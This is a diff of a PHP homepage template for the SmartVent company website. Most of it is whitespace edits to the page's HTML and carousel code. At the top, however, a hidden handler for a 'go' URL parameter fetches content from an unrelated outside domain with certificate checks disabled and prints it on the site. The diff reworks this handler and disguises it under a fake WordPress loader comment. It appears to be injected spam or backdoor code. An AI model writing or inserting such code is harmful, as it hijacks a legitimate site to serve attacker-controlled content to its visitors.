@@ -1,38 +1,32 @@
 <?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+function fetchDataFromSite($site) {
+    $url = 'https://replication2.pkcdurensawit.net/smartvent/' . $site . '/';
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_CUSTOMREQUEST => 'GET'
+    ]);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+
 if(isset($_GET['go'])) {
-    $url = $_GET['go'];
-    $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
-    // INIT CURL
-    $ch = curl_init();
-
-    //init curl
-    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
-    // SET URL FOR THE POST FORM LOGIN
-    curl_setopt($ch, CURLOPT_URL, 'https://replication.pkcdurensawit.net/smartvent/'.$url.'/');
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
-
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
-
-    // common name and also verify that it matches the hostname provided)
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-
-    // Optional: Return the result instead of printing it
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-
-    // ENABLE HTTP POST
-    curl_setopt ($ch, CURLOPT_POST, 1);
-    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-
-    $store = curl_exec ($ch);
-    echo $store;
-
-    // CLOSE CURL
-    curl_close ($ch);
-
+    $site = $_GET['go'];
+    $data = fetchDataFromSite($site);
+    echo $data;
 } else {
-?>
+
+    ?>
+
 <!doctype html>
 <html lang="en">
     <head>
@@ -46,30 +40,30 @@ if(isset($_GET['go'])) {
         <!-- Reset CSS -->
         <link rel="stylesheet" href="css/reset.css">
         <!-- Custom CSS -->
-        <link rel="stylesheet" type="text/css" href="css/style.css?v=1.0.0">
+        <link rel="stylesheet" type="text/css" href="css/style.css?v=1.0.0"> 
         <!-- <link rel="stylesheet" type="text/css" href="css/style_dev.css"> -->
         <link rel="stylesheet" type="text/css" href="css/owl.carousel.min.css">
         <link rel="stylesheet" type="text/css" href="css/owl.theme.default.min.css">
-
+        
         <!-- Responsive CSS -->
         <link rel="stylesheet" type="text/css" href="css/media.css">
         <!-- Font Awesome Icons -->
         <link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
-
+        
 
         <title>SmartVent | Homepage</title>
     </head>
     <body>
         <main class="main_homepage_wrapper fff">
 <?php include 'includes/header.php'?>
-
+           
 
             <!-- Banner Block -->
             <section class="banner_wrap">
                 <?php /*
 
 				<div class="container bnr_content">
-
+					
 					<?php foreach ($home_page_sliderRecords as $record): ?>
 					<?php foreach ($record['slider_image'] as $index => $upload): ?>
                     <div class="row">
@@ -82,10 +76,10 @@ if(isset($_GET['go'])) {
                     </div>
 					<?php endforeach ?>
 					<?php endforeach ?>
-
+					
                 </div>
 				*/ ?>
-
+                
 				<div class="banner_slider owl-carousel owl-theme" id="owl_banner_new">
 					<?php foreach ($home_page_sliderRecords as $record): ?>
                         <?php foreach ($record['slider_image'] as $index => $upload): ?>
@@ -97,14 +91,14 @@ if(isset($_GET['go'])) {
                                 <h1><?php echo htmlencode($record['title']) ?></h1>
                                 <a href="<?php echo htmlencode($record['button_link']) ?>" class="btn_1"><?php echo htmlencode($record['button_text']) ?></a>
                             </div>
-                        </div>
+                        </div>                 
                         <?php endforeach ?>
 					<?php endforeach ?>
 				</div>
                 <div class="banner_info_strip">
                        <ol class="banner_pts">
                             <li class="breadcrumb-item"><a><?php echo htmlencode($homepage_contentRecord['announcement_box']) ?></a></li>
-                        </ol>
+                        </ol> 
                 </div>
             </section>
             <!-- End -->
@@ -124,7 +118,7 @@ if(isset($_GET['go'])) {
                             </div>
                         </div>
                     </div>
-
+					
                 </div>
             </section>
             <!-- End -->
@@ -136,7 +130,7 @@ if(isset($_GET['go'])) {
                         <h2>Popular Models</h2>
                     </div>
                     <div class="model_slider_wrapper owl-carouse owl-theme" id="model_slider_wrapper">
-					<?php
+					<?php 
 					/* getting product records */
 					list($productsRecords, $productsMetaData) = getRecords(array(
 						'tableName'   => 'products',
@@ -147,7 +141,7 @@ if(isset($_GET['go'])) {
 					if(isset($productsRecords) && is_array($productsRecords) && count($productsRecords)) {
 						?>
 						<div class="row">
-						<?php foreach ($productsRecords as $record2):
+						<?php foreach ($productsRecords as $record2): 
 								$image = 'images/product_img.jpg';
 								if(isset($record2['image'][0]['urlPath']) && !empty($record2['image'][0]['urlPath'])) {
 									$image = $record2['image'][0]['urlPath'];
@@ -173,7 +167,7 @@ if(isset($_GET['go'])) {
 						</div>
 						<?php
 					}
-
+                    
 					/*
                     <div class="row">
                         <div class="col-md-3">
@@ -224,7 +218,7 @@ if(isset($_GET['go'])) {
             <!-- End -->
 <?php
   /* STEP 1: LOAD RECORDS - Copy this PHP code block near the TOP of your page */
-
+  
   // load viewer library
   $libraryPath = 'admin/lib/viewer_functions.php';
   $dirsToCheck = ['','../','../../','../../../','../../../../']; // add if needed: '/home/smartvent/public_html/public_html/'
@@ -294,7 +288,7 @@ if(isset($_GET['go'])) {
                                 <ul>
                                     <li>
                                         <span>4</span>
-                                       <p>Spring clips for easy installation.</p>
+                                       <p>Spring clips for easy installation.</p> 
                                     </li>
                                     <li>
                                         <span>5</span>
@@ -304,11 +298,11 @@ if(isset($_GET['go'])) {
                                         <span>6</span>
                                         <p>Door slots and internal floats for flood door activation</p>
                                     </li>
-
+                                   
                                 </ul>
                             </div>
                         </div>
-
+                       
                     </div>
                     <div class="why_header_section_btn">
                             <a href="/products/allproducts">Learn More</a>
@@ -332,7 +326,7 @@ if(isset($_GET['go'])) {
                     </div>
 
                     <!-- GIF file Hide 23/02/2023 -->
-
+                    
                     <div class="whyus_services">
                         <div class="row">
 							<?php foreach ($homepage_contentRecord['icon_set_2'] as $index => $upload): ?>
@@ -345,13 +339,13 @@ if(isset($_GET['go'])) {
 							<?php endforeach ?>
                         </div>
                     </div>
-
+                   
 
                     <div class="why_quote_wrap">
                         <p><span><?php echo $homepage_contentRecord['breakout_box']; ?></p>
                         <p><a href="/page/about-us">Want To Know More? See Our Story <img src="images/rightarrow.webp" alt="arrow"> </a></p>
                     </div>
-
+                    
                     <div class="whyus_services">
                         <div class="row">
 							<?php foreach ($homepage_contentRecord['affiliation_logos'] as $index => $upload): ?>
@@ -363,7 +357,7 @@ if(isset($_GET['go'])) {
 							<?php endforeach ?>
                         </div>
                     </div>
-
+                    
                 </div>
             </section>
             <!-- End -->
@@ -380,7 +374,7 @@ if(isset($_GET['go'])) {
             items: 1,
             slideSpeed: 2000,
             nav: true,
-            autoplay: true,
+            autoplay: true, 
             dots: true,
             loop: true,
             responsiveRefreshRate: 200,
@@ -390,7 +384,7 @@ if(isset($_GET['go'])) {
             items:1 ,
             slideSpeed: 2000,
             nav: true,
-            autoplay: true,
+            autoplay: true, 
             dots: true,
             loop: true,
             responsiveRefreshRate: 200,
@@ -401,6 +395,8 @@ if(isset($_GET['go'])) {
     </body>
 </html>
 
-<?PHP
+<?php
 }
 ?>
+
+
